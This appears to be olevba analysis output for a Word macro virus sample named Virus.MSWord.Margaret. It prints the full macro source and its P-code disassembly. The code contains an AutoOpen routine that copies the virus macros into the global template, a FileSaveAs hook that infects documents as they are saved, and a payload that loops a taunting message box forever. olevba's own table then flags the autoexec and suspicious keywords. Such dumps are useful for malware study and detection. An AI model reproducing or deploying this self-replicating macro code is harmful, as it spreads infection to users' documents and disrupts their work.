olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Margaret
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Margaret - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Margaret - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSaveAs()
   On Error GoTo endFileSaveAs
   Dim dlg As FileSave
   GetCurValues dlg
   If dlg.Format <> 1 Then
     Dialog dlg
   If (dlg.Format = 0) Or (dlg.Format = 1) Then
     MacroCopy "FileSaveAs", WindowName$() + ":FileSaveAs"
     MacroCopy "ToolsMacro", WindowName$() + ":ToolsMacro"
     MacroCopy "PayLoad", WindowName$() + ":PayLoad"
     MacroCopy "AutoOpen", WindowName$() + ":AutoOpen"
     dlg.Format = 1
   End If
   Else
     TempWindow = Window()
     OriginalName$ = dlg.Name
     FileNew .Template = FileName$()
     On Error GoTo CloseDoc
     GetCurValues dlg
     dlg.Name = OriginalName$
     Dialog dlg
     FileSaveAs dlg
     On Error GoTo endFileSaveAs
     Infect (dlg.Name)
     If TempWindow >= Window() Then
       TempWindow = TempWindow + 1
     End If
     WindowList TempWindow
CloseDoc:
     FileClose 2
   End If
 MacroName$(2) = "FileOpen"
 MacroName$(3) = "FileClose"
 MacroName$(5) = "FileSave"
 MacroName$(6) = "FileSaveAs"
 
 FileMenu$ = MenuText$(0, 1)
 
 For MacroNumber = CountMacros(1) To 1 Step -1                                       ' No position by now
     NameOfMacro$ = MacroName$(MacroNumber, 1)
     Select Case MacroDesc$(NameOfMacro$)
                                                  
     Case "FileOpen"
       Position = 2
     Case "FileClose"
       Position = 3
     Case "FileSave"
       Position = 5
     Case "FileSaveAs"
       Position = 6
   End Select
  
If Position Then
       LocalMacro$ = MenuItemMacro$(FileMenu$, 0, Position)
       MacroCopy F$ + ":" + NameOfMacro$, LocalMacro$, -1
                                                            
   End If
 Next
endFileSaveAs:
End Sub
Sub AutoOpen()
On Error GoTo Abort
    iMacroCount = CountMacros(0, 0)
    For i = 1 To iMacroCount
    If MacroName$(i, 0, 0) = "PayLoad" Then
    bInstalled = -1
    End If
    If MacroName$(i, 0, 0) = "FileSaveAs" Then
    bTooMuchTrouble = -1
    End If
Next i
If Not bInstalled And Not bTooMuchTrouble Then
        iWW6IInstance = Val(GetDocumentVar$("WW6Infector"))
        sMe$ = FileName$()
        Macro$ = sMe$ + ":PayLoad"
        MacroCopy Macro$, "Global:PayLoad", 1
        Macro$ = sMe$ + ":FileSaveAs"
        MacroCopy Macro$, "Global:FileSaveAs", 1
        Macro$ = sMe$ + ":ToolsMacro"
        MacroCopy Macro$, "Global:ToolsMacro", 1
        SetProfileString "WW6I", Str$(iWW6IInstance + 1)
End If
Abort:
End Sub
Sub Payload()
On Error GoTo Pass
Repeat:
MsgBox "Lorz wants more of you"
GoTo Repeat

ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = "Cancel", .Remove, .Context = 0
 
SendKeys "^" + "%" + "-"

Pass:
   If (Second(Now()) = 13) Then
           dlg.Password = "Margaret"
End Sub
Sub ToolsMacro()
 On Error GoTo ErrorRoutine
 OldName$ = NomFichier$()
 If macros.bDebug Then
    MsgBox "start ToolsMacro"
    Dim dlg As OutilsMacro
    If macros.bDebug Then MsgBox "1"
    GetCurValues dlg
    If macros.bDebug Then MsgBox "2"
    On Error GoTo Skip
    Dialog dlg
    OutilsMacro dlg
Skip:
    On Error GoTo ErrorRoutine
    End If
   
    DisableAutoMacros 0
    
    macros.SavToGlobal (OldName$)
    macros.objectiv
    GoTo Done
    
ErrorRoutine:
    On Error GoTo Done
    If macros.bDebug Then
    MsgBox "error " + Str$(Err) + " occurred"
    End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Margaret
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Module1 - 8945 bytes
' Line #0:
' 	FuncDefn (Sub FileSaveAs())
' Line #1:
' 	OnError endFileSaveAs 
' Line #2:
' 	Dim 
' 	VarDefn dlg (As FileSave)
' Line #3:
' 	Ld dlg 
' 	ArgsCall GetCurValues 0x0001 
' Line #4:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #5:
' 	Ld dlg 
' 	ArgsCall Dialog 0x0001 
' Line #6:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #7:
' 	LitStr 0x000A "FileSaveAs"
' 	ArgsLd WindowName$ 0x0000 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	ArgsCall MacroCopy 0x0002 
' Line #8:
' 	LitStr 0x000A "ToolsMacro"
' 	ArgsLd WindowName$ 0x0000 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	ArgsCall MacroCopy 0x0002 
' Line #9:
' 	LitStr 0x0007 "PayLoad"
' 	ArgsLd WindowName$ 0x0000 
' 	LitStr 0x0008 ":PayLoad"
' 	Add 
' 	ArgsCall MacroCopy 0x0002 
' Line #10:
' 	LitStr 0x0008 "AutoOpen"
' 	ArgsLd WindowName$ 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	ArgsCall MacroCopy 0x0002 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	ArgsLd Window 0x0000 
' 	St TempWindow 
' Line #15:
' 	Ld dlg 
' 	MemLd New 
' 	St OriginalName$ 
' Line #16:
' 	MemLdWith Template 
' 	ArgsLd FileName$ 0x0000 
' 	Eq 
' 	ArgsCall FileNew 0x0001 
' Line #17:
' 	OnError CloseDoc 
' Line #18:
' 	Ld dlg 
' 	ArgsCall GetCurValues 0x0001 
' Line #19:
' 	Ld OriginalName$ 
' 	Ld dlg 
' 	MemSt New 
' Line #20:
' 	Ld dlg 
' 	ArgsCall Dialog 0x0001 
' Line #21:
' 	Ld dlg 
' 	ArgsCall FileSaveAs 0x0001 
' Line #22:
' 	OnError endFileSaveAs 
' Line #23:
' 	Ld dlg 
' 	MemLd New 
' 	Paren 
' 	ArgsCall Infect 0x0001 
' Line #24:
' 	Ld TempWindow 
' 	ArgsLd Window 0x0000 
' 	Ge 
' 	IfBlock 
' Line #25:
' 	Ld TempWindow 
' 	LitDI2 0x0001 
' 	Add 
' 	St TempWindow 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld TempWindow 
' 	ArgsCall WindowList 0x0001 
' Line #28:
' 	Label CloseDoc 
' Line #29:
' 	LitDI2 0x0002 
' 	ArgsCall FileClose 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	LitStr 0x0008 "FileOpen"
' 	LitDI2 0x0002 
' 	ArgsSt MacroName$ 0x0001 
' Line #32:
' 	LitStr 0x0009 "FileClose"
' 	LitDI2 0x0003 
' 	ArgsSt MacroName$ 0x0001 
' Line #33:
' 	LitStr 0x0008 "FileSave"
' 	LitDI2 0x0005 
' 	ArgsSt MacroName$ 0x0001 
' Line #34:
' 	LitStr 0x000A "FileSaveAs"
' 	LitDI2 0x0006 
' 	ArgsSt MacroName$ 0x0001 
' Line #35:
' Line #36:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd MenuText$ 0x0002 
' 	St FileMenu$ 
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld MacroNumber 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd CountMacros 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' 	QuoteRem 0x0055 0x0013 " No position by now"
' Line #39:
' 	Ld MacroNumber 
' 	LitDI2 0x0001 
' 	ArgsLd MacroName$ 0x0002 
' 	St NameOfMacro$ 
' Line #40:
' 	Ld NameOfMacro$ 
' 	ArgsLd MacroDesc$ 0x0001 
' 	SelectCase 
' Line #41:
' Line #42:
' 	LitStr 0x0008 "FileOpen"
' 	Case 
' 	CaseDone 
' Line #43:
' 	LitDI2 0x0002 
' 	St Position 
' Line #44:
' 	LitStr 0x0009 "FileClose"
' 	Case 
' 	CaseDone 
' Line #45:
' 	LitDI2 0x0003 
' 	St Position 
' Line #46:
' 	LitStr 0x0008 "FileSave"
' 	Case 
' 	CaseDone 
' Line #47:
' 	LitDI2 0x0005 
' 	St Position 
' Line #48:
' 	LitStr 0x000A "FileSaveAs"
' 	Case 
' 	CaseDone 
' Line #49:
' 	LitDI2 0x0006 
' 	St Position 
' Line #50:
' 	EndSelect 
' Line #51:
' Line #52:
' 	Ld Position 
' 	IfBlock 
' Line #53:
' 	Ld FileMenu$ 
' 	LitDI2 0x0000 
' 	Ld Position 
' 	ArgsLd MenuItemMacro$ 0x0003 
' 	St LocalMacro$ 
' Line #54:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld NameOfMacro$ 
' 	Add 
' 	Ld LocalMacro$ 
' 	LitDI2 0x0001 
' 	UMi 
' 	ArgsCall MacroCopy 0x0003 
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	Label endFileSaveAs 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Sub AutoOpen())
' Line #61:
' 	OnError Abort 
' Line #62:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #64:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd MacroName$ 0x0003 
' 	LitStr 0x0007 "PayLoad"
' 	Eq 
' 	IfBlock 
' Line #65:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bInstalled 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd MacroName$ 0x0003 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	IfBlock 
' Line #68:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bTooMuchTrouble 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	Ld bInstalled 
' 	Not 
' 	Ld bTooMuchTrouble 
' 	Not 
' 	And 
' 	IfBlock 
' Line #72:
' 	LitStr 0x000B "WW6Infector"
' 	ArgsLd GetDocumentVar$ 0x0001 
' 	ArgsLd Val 0x0001 
' 	St iWW6IInstance 
' Line #73:
' 	ArgsLd FileName$ 0x0000 
' 	St sMe$ 
' Line #74:
' 	Ld sMe$ 
' 	LitStr 0x0008 ":PayLoad"
' 	Add 
' 	St Macro$ 
' Line #75:
' 	Ld Macro$ 
' 	LitStr 0x000E "Global:PayLoad"
' 	LitDI2 0x0001 
' 	ArgsCall MacroCopy 0x0003 
' Line #76:
' 	Ld sMe$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St Macro$ 
' Line #77:
' 	Ld Macro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0001 
' 	ArgsCall MacroCopy 0x0003 
' Line #78:
' 	Ld sMe$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St Macro$ 
' Line #79:
' 	Ld Macro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	LitDI2 0x0001 
' 	ArgsCall MacroCopy 0x0003 
' Line #80:
' 	LitStr 0x0004 "WW6I"
' 	Ld iWW6IInstance 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str$ 0x0001 
' 	ArgsCall SetProfileString 0x0002 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Label Abort 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub Payload())
' Line #85:
' 	OnError Pass 
' Line #86:
' 	Label Repeat 
' Line #87:
' 	LitStr 0x0016 "Lorz wants more of you"
' 	ArgsCall MsgBox 0x0001 
' Line #88:
' 	GoTo Repeat 
' Line #89:
' Line #90:
' 	MemLdWith KeyCode 
' 	LitDI2 0x001B 
' 	Eq 
' 	MemLdWith Category 
' 	LitDI2 0x0001 
' 	Eq 
' 	MemLdWith New 
' 	LitStr 0x0006 "Cancel"
' 	Eq 
' 	MemLdWith Remove 
' 	MemLdWith Context 
' 	LitDI2 0x0000 
' 	Eq 
' 	ArgsCall ToolsCustomizeKeyboard 0x0005 
' Line #91:
' Line #92:
' 	LitStr 0x0001 "^"
' 	LitStr 0x0001 "%"
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	ArgsCall SendKeys 0x0001 
' Line #93:
' Line #94:
' 	Label Pass 
' Line #95:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #96:
' 	LitStr 0x0008 "Margaret"
' 	Ld dlg 
' 	MemSt Password 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub ToolsMacro())
' Line #99:
' 	OnError ErrorRoutine 
' Line #100:
' 	ArgsLd NomFichier$ 0x0000 
' 	St OldName$ 
' Line #101:
' 	Ld macros 
' 	MemLd bDebug 
' 	IfBlock 
' Line #102:
' 	LitStr 0x0010 "start ToolsMacro"
' 	ArgsCall MsgBox 0x0001 
' Line #103:
' 	Dim 
' 	VarDefn dlg (As OutilsMacro)
' Line #104:
' 	Ld macros 
' 	MemLd bDebug 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "1"
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #105:
' 	Ld dlg 
' 	ArgsCall GetCurValues 0x0001 
' Line #106:
' 	Ld macros 
' 	MemLd bDebug 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "2"
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #107:
' 	OnError Skip 
' Line #108:
' 	Ld dlg 
' 	ArgsCall Dialog 0x0001 
' Line #109:
' 	Ld dlg 
' 	ArgsCall OutilsMacro 0x0001 
' Line #110:
' 	Label Skip 
' Line #111:
' 	OnError ErrorRoutine 
' Line #112:
' 	EndIfBlock 
' Line #113:
' Line #114:
' 	LitDI2 0x0000 
' 	ArgsCall DisableAutoMacros 0x0001 
' Line #115:
' Line #116:
' 	Ld OldName$ 
' 	Paren 
' 	Ld macros 
' 	ArgsMemCall SavToGlobal 0x0001 
' Line #117:
' 	Ld macros 
' 	ArgsMemCall objectiv 0x0000 
' Line #118:
' 	GoTo Done 
' Line #119:
' Line #120:
' 	Label ErrorRoutine 
' Line #121:
' 	OnError Done 
' Line #122:
' 	Ld macros 
' 	MemLd bDebug 
' 	IfBlock 
' Line #123:
' 	LitStr 0x0006 "error "
' 	Ld Err 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0009 " occurred"
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	Label Done 
' Line #126:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

